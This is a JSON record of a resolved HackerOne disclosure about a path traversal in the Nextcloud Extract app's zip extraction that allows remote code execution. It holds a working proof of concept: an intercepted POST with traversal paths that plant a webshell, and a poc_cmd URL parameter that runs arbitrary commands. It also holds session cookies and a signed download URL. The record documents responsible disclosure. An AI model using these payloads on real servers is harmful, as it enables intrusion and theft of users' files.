@@ -1,0 +1,208 @@
+{
+  "id": 765291,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC83NjUyOTE=",
+  "url": "https://hackerone.com/reports/765291",
+  "title": "Remote code execution via path traversal in Zip extraction in the Extract app",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "high",
+  "readable_substate": "Resolved",
+  "created_at": "2019-12-27T23:07:56.864Z",
+  "submitted_at": "2019-12-27T23:07:56.864Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "emilvirkki",
+    "url": "/emilvirkki",
+    "profile_picture_urls": {
+      "small": "/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 13291,
+    "url": "https://hackerone.com/nextcloud",
+    "handle": "nextcloud",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/hsgut1vi1cv8housqai9cm9383yx/b8e19a7691128fca51630d7f5b14644b91b3b45324f6fd488e36244d744fe35b",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/hsgut1vi1cv8housqai9cm9383yx/89f037b490baf3dcca1b84283f4c85141b64c213252a9c79b56c62bf903ab542"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Nextcloud",
+      "twitter_handle": "nextclouders",
+      "website": "https://nextcloud.com",
+      "about": "Access, share and protect your files, calendars, contacts, communication & more at home and in your enterprise."
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2020-03-07T12:54:55.538Z",
+  "bug_reporter_agreed_on_going_public_at": null,
+  "team_member_agreed_on_going_public_at": "2020-02-06T12:54:55.135Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "I realise this doesn't qualify for a reward, as it's a vulnerability in a third-party app, but as the app is part of the \"official\" VM image provided by Hansson IT, I think it's well worth fixing.\n\nThe Extract app doesn't validate the path or filename of a zip file to be extracted, allowing an attacker to create or overwrite arbitrary files.\n\nHow to reproduce\n===\n\nInstall NextCloud using the VM image with default settings (with the extra security options).\n\nCreate a new user with no user group and log in as that user.\n\nUpload the payload zip file (nextcloud-shell.zip, attached) to the root folder (or wherever you like). It contains a modified version of apps/files/App.php, necessary for getting the payload to run.\n\nClick the \"Extract here\" option for the nextcloud-shell.zip and intercept the request. Modify the **request body** so the request looks something like the following. You need to replace \"normaluser\" with the username of the user you created in (2):\n\n```\nPOST /index.php/apps/extract/ajax/extractHere.php HTTP/1.1\nHost: 192.168.100.32\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:71.0) Gecko/20100101 Firefox/71.0\nAccept: */*\nAccept-Language: fi-FI,fi;q=0.8,en-US;q=0.5,en;q=0.3\nAccept-Encoding: gzip, deflate, br\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\nrequesttoken: lv0G5+K7v/a3w30wOMyR35SvBgF35GHmiuoejP+8u7g=:w5s+qIPUj8aAohdpWojkiazdVXYRkwyp47t8ypHy/+4=\nOCS-APIREQUEST: true\nX-Requested-With: XMLHttpRequest\nContent-Length: 55\nOrigin: https://192.168.100.32\nDNT: 1\nConnection: close\nCookie: ocmmdvtkydkx=1u2e2imt5h7g0pimv84eoqnfco; oc_sessionPassphrase=MXmMNXhcE3%2FpbZla9mKTYIS18lYG49cMP8lTHFrJfGe1jLxHd2hHfg8vYs1O6hFjv2IbkI31jhMeJnajKWNYzIb7G3f9UNiFmyKJwAbzPWLKY594ScipzPr6u%2BN9SUp3; __Host-nc_sameSiteCookielax=true; __Host-nc_sameSiteCookiestrict=true; nc_username=normaluser; nc_token=FkBWj5z2dOJS0v4putAyW2oL7tAEOc9Q; nc_session_id=1u2e2imt5h7g0pimv84eoqnfco\n\nnameOfFile=../../../../../../mnt/ncdata/normaluser/files/nextcloud-shell.zip&directory=/../../../../var/www/nextcloud/apps/files/lib&external=0\n```\n\nOpen the following URL (replace host ip with your actual install) and observe how the current user and group are printed: `https://192.168.100.32/apps/files/?dir=/&poc_cmd=whoami`. You can obviously change the poc_cmd parameter to run any command you like.\n\n## Impact\n\nThe attacker can run any commands with the privileges of the www-data user. This allows the attacker to access and modify all the files and personally identifiable information in the installation.",
+  "weakness": {
+    "id": 19,
+    "name": "Path Traversal"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 670123,
+      "file_name": "nextcloud-shell.zip",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/5Mh2dyHyxTcwGZKe1fmocZ91?response-content-disposition=attachment%3B%20filename%3D%22nextcloud-shell.zip%22%3B%20filename%2A%3DUTF-8%27%27nextcloud-shell.zip&response-content-type=application%2Fzip&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ7GS3YI3Z%2F20260708%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260708T051242Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjELX%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDOizwrxJ1e16pZq0mDsw2hk1KqpKK9uH%2BBKzdFNknTiAIhAMynmw5EsfeZA0Yhy89IaBWXM9HE2AvJfTiMIh3mk79PKrIFCH4QAxoMMDEzNjE5Mjc0ODQ5IgxSIPpvCja%2FAqysvMsqjwXQz0nlgCp4%2BopRGBLzK4wjtoOQl3UYhobPSJ3t1Fnmh0ZRml6jk7vcSO2o50ALUNBhf9LTpWy6umfduG9vBpSlPE5%2FxxhHULFJQWI4%2BC2vPFYCJ4otLRuMcihYemttCpVV14aTjkgQWP3jyIv9g8m9900ngSHiCg3O9pweYqKRis%2BCNazFkU5PfwieOD%2B9DC0Jvc%2B4M6ovG3hXADdgv4sMazvYKG1vKs9kSB8M83l%2FBnionOc2AlTjso6BSmVRU8fpBAuSPAADtskATCokuRURmcjowPrIVM%2B6P7t7Tk5f80AaGI5sNdq44NILICxNtu58aRLUyHe9xadRv45nNTuXTUIbXwCHTW9rK2ZIV1rpfXbXOHyToS7HvSAwA3e5L8WzId7IAAP%2BKa9vMDKdkNT7oPoQlptvQ28QWZ4iwP4GQy7o%2Fd1pMkS8NjUAck0D1pIfG3lP9kVMM3k%2F%2FTJSc5vhYOUP9RXjN66WDNBC8XeOGMT4zz3si%2FuwxKoMrOhyiF3Z8lfG8cfQnsu8VeABRkS5KnO56WtdTjoxch3f6LmpLo4aMfh%2FnYaSK%2FZMKgYR7jpq1VQAjAe0wZC1ofmDbP3zSwCWVqxh53ZHMySFy7sc%2F9jHNimMLaifXzP5SUKbbWYP3OGevczRenMLDNhVqvStEMDPhHNPtMPjuoSyWZLTwe8T9xFI67F%2FZGIaGNkdBPH950SY0OkQ%2FLWEbyre3vXYtUCtpnFeUcwIekjOY9u8uI7ugANQtdCRRd%2F0900A5fa6iDb1Qn6wRcc6DWuDZf6WdDb33OYfnM7KnmR3f8%2BP5%2B62NBwhxSJpFDV%2F4oKklklY6BFx4tqwqz%2BBTcp7HxKsa5lPVDbiLnobkrwFm%2BvFMM%2But9IGOrABOUciHExQZMIYzwPwmpOAJ%2BvCFgHfegrIq6lWgm2fr2OzppL5%2FGKtGW6o3Tvop%2BYnxW3edJ2zbRjIi%2FfIMCdaTKJ60SlYN6FndbbCZVpgZxKxtHzpKYQKJe6CfMf40QwqTNDVvSeRBGPgVJzpXf1o1LlNLm4je7%2Fcos5Z1lyZsZodHyxbRwSNRF7GL5JHjPpkZdKxGOOjKhNU%2B6HUDlg71XC87tP6udnekHTNiprc0Ug%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=f186d77f58a6d1cd9ec61dfb1693990e323af4b3b72048c4e68428fe83ae308c",
+      "file_size": 1094,
+      "type": "application/zip",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2020-03-07T12:54:55.230Z",
+  "allow_singular_disclosure_after": -199901867.3058555,
+  "singular_disclosure_allowed": true,
+  "vote_count": 40,
+  "voters": [
+    "aituglo",
+    "saulius",
+    "m4khn0",
+    "a_d_a_m",
+    "yvvdwf",
+    "tess",
+    "h4x0r_dz",
+    "az1441",
+    "mayurudiniya",
+    "hundredpercent",
+    "and 30 more..."
+  ],
+  "severity": {
+    "rating": "high",
+    "score": 8.8,
+    "author_type": "User",
+    "metrics": {
+      "attack_vector": "network",
+      "attack_complexity": "low",
+      "privileges_required": "low",
+      "user_interaction": "none",
+      "scope": "unchanged",
+      "confidentiality": "high",
+      "integrity": "high",
+      "availability": "high"
+    }
+  },
+  "structured_scope": {
+    "databaseId": 42,
+    "asset_type": "URL",
+    "asset_identifier": "apps.nextcloud.com",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ],
+  "databaseId": "765291",
+  "votes": 40,
+  "latest_disclosable_activity_at": "2020-03-07T12:54:55.567Z",
+  "_metadata": {
+    "saved_at": "2026-07-08T13:12:42.644525",
+    "source": "https://hackerone.com/reports/765291.json",
+    "report_id": 765291
+  },
+  "_graphql_detail": {
+    "id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC83NjUyOTE=",
+    "databaseId": "765291",
+    "title": "Remote code execution via path traversal in Zip extraction in the Extract app",
+    "url": "https://hackerone.com/reports/765291",
+    "state": null,
+    "substate": "resolved",
+    "disclosed_at": "2020-03-07T12:54:55.538Z",
+    "created_at": "2019-12-27T23:07:56.864Z",
+    "submitted_at": null,
+    "weakness": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL1dlYWtuZXNzLzE5",
+      "name": "Path Traversal",
+      "external_id": "cwe-22"
+    },
+    "severity": {
+      "rating": "high",
+      "score": 8.8
+    },
+    "reporter": {
+      "username": "emilvirkki"
+    },
+    "team": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL0VuZ2FnZW1lbnRzOjpCdWdCb3VudHlQcm9ncmFtLzEzMjkx",
+      "handle": "nextcloud",
+      "name": "Nextcloud",
+      "url": "https://hackerone.com/nextcloud",
+      "currency": "usd"
+    },
+    "bounties": {
+      "edges": []
+    }
+  },
+  "_hacktivity": {
+    "__typename": "HacktivityDocument",
+    "id": "Z2lkOi8vaGFja2Vyb25lL0NvbXBsZXRlSGFja3Rpdml0eVJlcG9ydEluZGV4Lzc2NTI5MQ==",
+    "_id": "765291",
+    "disclosed": true,
+    "votes": 40,
+    "latest_disclosable_activity_at": "2020-03-07T12:54:55.567Z",
+    "report": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC83NjUyOTE=",
+      "databaseId": "765291",
+      "title": "Remote code execution via path traversal in Zip extraction in the Extract app",
+      "url": "https://hackerone.com/reports/765291",
+      "disclosed_at": "2020-03-07T12:54:55.538Z"
+    },
+    "team": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL0VuZ2FnZW1lbnRzOjpCdWdCb3VudHlQcm9ncmFtLzEzMjkx",
+      "handle": "nextcloud",
+      "name": "Nextcloud",
+      "url": "https://hackerone.com/nextcloud",
+      "currency": "usd"
+    }
+  }
+}
